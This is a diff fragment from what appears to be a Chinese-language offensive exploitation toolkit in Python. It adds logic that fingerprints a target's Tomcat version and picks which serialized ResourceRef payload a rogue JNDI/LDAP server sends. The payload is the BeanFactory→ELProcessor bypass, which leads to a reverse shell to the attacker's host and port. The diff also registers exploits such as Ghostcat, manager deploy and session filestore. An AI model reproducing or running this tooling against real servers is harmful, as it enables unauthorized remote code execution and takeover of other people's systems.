+        return "B", "Tomcat %s ≥ 9.0.40，ResourceRef 已改为继承 AbstractRef" % version
+    if maj == 8 and mnr == 5 and pat >= 70:
+        return "B", "Tomcat %s ≥ 8.5.70，ResourceRef 已改为继承 AbstractRef" % version
+    if maj == 8 and mnr == 5 and pat < 70:
+        return "A", "Tomcat %s < 8.5.70，ResourceRef 仍直连 Reference" % version
+    return "A", "Tomcat %s 属老层级，ResourceRef 直连 Reference" % version
+
+
+def ex_tomcat_serref_variant(target, p):
+    """告诉你在 BeanFactory 绕过里该用 serrefA 还是 serrefB —— 省掉手动逐个试。
+
+    version 留空时会用 tomcat.probe 的同款逻辑去现场探测（GET / 的 Server 头 →
+    RELEASE-NOTES → 错误页），探测不到就退化成「先试 B、自动回退 A」。
+    """
+    base = normalize(target)
+    to = int(p.get("timeout", 6) or 6)
+    ver = (p.get("version") or "").strip()
+    how = "手工指定"
+    evid = []
+    if not ver and base:
+        ver, evid = _tomcat_version(base, to)
+        how = "现场探测"
+    variant, why = _serref_variant_for(ver)
+    lines = ["目标        : %s" % (base or "-"),
+             "版本来源    : %s" % how,
+             "版本        : %s" % (ver or "未识别")]
+    lines += ["             %s" % e for e in evid[:6]]
+    lines.append("")
+    if variant:
+        other = "A" if variant == "B" else "B"
+        lines.append("★ 结论: 用 **serref%s** —— %s" % (variant, why))
+        lines.append("")
+        lines.append("后续怎么做：")
+        lines.append("  1) 起 JNDI 服务时把 tomcat_version=%s 带上（留空则自动探测），" % ver)
+        lines.append("     LDAP 就会固定下发 serref%s，不再轮流两个变体试错；" % variant)
+        lines.append("  2) 若依然失败，再手动换 serref%s —— 有些镜像改过 naming 包。" % other)
+        lines.append("")
+        lines.append("原理：Tomcat 的 BeanFactory 要求 obj instanceof ResourceRef，而这个类的父类层级\n"
+                     "在不同版本里不一样。本地 tools/serrefA、tools/serrefB 两个目录就是按这两种层级\n"
+                     "分别编译好的对象：选错的那侧在目标上会 ClassNotFoundException / 压根不触发。")
+    else:
+        lines.append("★ 结论: 版本没探到 —— 采用「先试 B、失败自动回退 A」的策略（顺序 B→A）。")
+        lines.append("")
+        lines.append("  · 已知更可能是新版 Tomcat（连 Server 头被删也不用慌），优先 B；")
+        lines.append("  · 起 JNDI 服务时不填 tomcat_version 就是这个行为：每个 LDAP SearchRequest\n"
+                     "    轮换下发一个变体（B→A→B…），直到某个接通 —— 看监听/HTTP 回调就知道是哪个。")
+    # 顺带报一下本机这两个 serref 是否齐备
+    have = [v for v in ("A", "B") if os.path.isdir(os.path.join(HERE, "tools", "serref" + v))]
+    lines.append("")
+    lines.append("本机 serref 可用: %s%s" % ("/".join(have) or "无",
+                                            "" if len(have) == 2 else "  ⚠ 缺一个就没得自动回退"))
+    if not shutil.which("java"):
+        lines.append("⚠ 本机没有 java —— 两条都生成不了，只能退化成普通 Reference。")
+    return {"ok": bool(variant),
+            "output": ("用 serref%s（Tomcat %s）" % (variant, ver)) if variant
+                      else "版本未知：先试 B，自动回退 A",
+            "detail": "\n".join(lines),
+            "variant": variant or "", "version": ver}
+
+
 EXPLOITS = {
     "shiro.brutekey": ex_shiro_brutekey,
     "shiro.exploit": ex_shiro_exploit,
@@ -4583,6 +5315,10 @@ EXPLOITS = {
     "tomcat.probe": ex_tomcat_probe,
     "tomcat.tribes_rce": ex_tomcat_tribes_rce,
     "tomcat.session_put": ex_tomcat_session_put,
+    "tomcat.ajp_ghostcat": ex_tomcat_ajp_ghostcat,
+    "tomcat.manager_deploy": ex_tomcat_manager_deploy,
+    "tomcat.session_filestore": ex_tomcat_session_filestore,
+    "tomcat.serref_variant": ex_tomcat_serref_variant,
 }
 
 
@@ -4630,6 +5366,31 @@ def _set(items):
     return b"\x31" + _tlen(sum(len(x) for x in items)) + b"".join(items)
 
 
+def _pick_serref_variant(state, ser):
+    """在可用的 ResourceRef 变体里挑一条。返回 (variant, 理由)。
+
+    策略（避免人工来回试）：
+      ① state["ser_variant"] 已由 tomcat_version 定好 → 固定下发那一条；
+      ② state["ser_order"] 给了优先级（缺省 B 在先）→ 按序轮流，
+         这样客户端重试一次就自动落到另一条，不需要用户手动切换。
+    """
+    order = [x for x in (state.get("ser_order") or ("B", "A")) if x in ser] \
+        or [x for x in ("B", "A") if x in ser]
+    if not order:
+        return "", "没有可下发的变体"
+    want = state.get("ser_variant")
+    if want in order:
+        return want, "按 Tomcat %s 选定" % (state.get("tomcat_version") or "?")
+    if want:
+        # 版本结论指向的那条本机没生成出来 —— 不能硬返回它（下游会 KeyError），
+        # 老实退回实际有的那条，并在理由里说清楚这层落差。
+        return order[0], ("本机没生成出 serref%s（版本 %s 本应用它），降级用 serref%s"
+                          % (want, state.get("tomcat_version") or "?", order[0]))
+    idx = int(state.get("ser_idx") or 0)
+    state["ser_idx"] = idx + 1
+    return order[idx % len(order)], "版本未知，轮流试错(%s)" % "→".join(order)
+
+
 class LDAPHandler(socketserver.BaseRequestHandler):
     """JNDI/LDAP 服务端。注意：TCP 会粘包，一次 recv 可能含多条 LDAPMessage，
     必须按 BER 长度把缓冲区里所有完整消息逐个处理，否则 Bind+Search 粘在一起时会丢掉 Search。"""
@@ -4662,17 +5423,18 @@ class LDAPHandler(socketserver.BaseRequestHandler):
                 ser = j.get("ser") or {}
                 log("LDAP bypass: ser=%s" % ("/".join(ser.keys()) or "普通Reference(不推荐)"))
                 if ser:
-                    variants = [x for x in ("B", "A") if x in ser]   # B(新层级)优先
-                    idx = j.get("ser_idx", 0)
-                    v = variants[idx % len(variants)]
-                    j["ser_idx"] = idx + 1
+                    v, why = _pick_serref_variant(j, ser)
+                    if v not in ser:            # 兜底：绝不拿空/不存在的 key 去下标
+                        v, why = sorted(ser.keys())[0], "兜底取仅有的 serref%s" % v
+                    j["ser_used"] = v
+                    log("LDAP bypass: 下发 serref%s（%s）" % (v, why))
                     attrs = b"".join([
                         _seq(_oct("javaClassName") + _set([_oct("javax.el.ELProcessor")])),
                         _seq(_oct("objectClass") + _set([_oct("javaObject"), _oct("javaSerializedData")])),
                         _seq(_oct("javaSerializedData") + _set([_oct(ser[v])])),
                     ])
-                    detail = "下发序列化ResourceRef[%s] BeanFactory→ELProcessor (反弹 %s:%s)" % (
-                        v, j.get("lhost"), j.get("lport"))
+                    detail = "下发序列化ResourceRef[%s] BeanFactory→ELProcessor（%s，反弹 %s:%s）" % (
+                        v, why, j.get("lhost"), j.get("lport"))
                 else:
                     # java 缺失时的退化路径：普通 Reference（仅对支持普通 Reference 的工厂有效）
                     attrs = b"".join([
@@ -4956,6 +5718,28 @@ def jndi_start(p):
               "factory": p.get("factory") or "Exploit", "err": ""})
     lport = int(p.get("lport") or (STATE.get("listener", {}).get("port") or PORT_DEFAULT["listener"]))
     notes = []
+
+    # serrefA/B 层级选择：给了 tomcat_version 就按版本定死一个变体，不再来回试；
+    # 没给且给了 target 就顺手探一次版本（和 tomcat.probe 同款逻辑）。
+    tv = (p.get("tomcat_version") or p.get("version") or "").strip()
+    if not tv and p.get("target") and str(p.get("auto_version", "1")).strip() not in ("0", "false", "no"):
+        try:
+            tv, _ = _tomcat_version(normalize(p.get("target", "")), 5)
+        except Exception:
+            tv = ""
+    pick = p.get("ser_variant", "").strip().upper()
+    if tv and pick not in ("A", "B"):
+        pick, _ = _serref_variant_for(tv)
+    j["tomcat_version"] = tv
+    j["ser_variant"] = pick if pick in ("A", "B") else ""
+    j["ser_idx"] = 0
+    j["ser_used"] = ""
+    if tv and j["ser_variant"]:
+        notes.append("目标 Tomcat %s → 固定下发 serref%s（不必再手动试另一条）"
+                     % (tv, j["ser_variant"]))
+    elif mode == "bypass":
+        notes.append("未拿到目标版本 → 按 B→A 顺序轮流下发（每次请求换一个），"
+                     "看哪个能触发就是哪条；想定死就把 tomcat_version 填上")
 
     # ---- 1) 先占位绑定（失败自动向后探测端口），拿到真实端口后再算 codebase ----
     srv, ldap_port, info_l = bind_tcp_server(
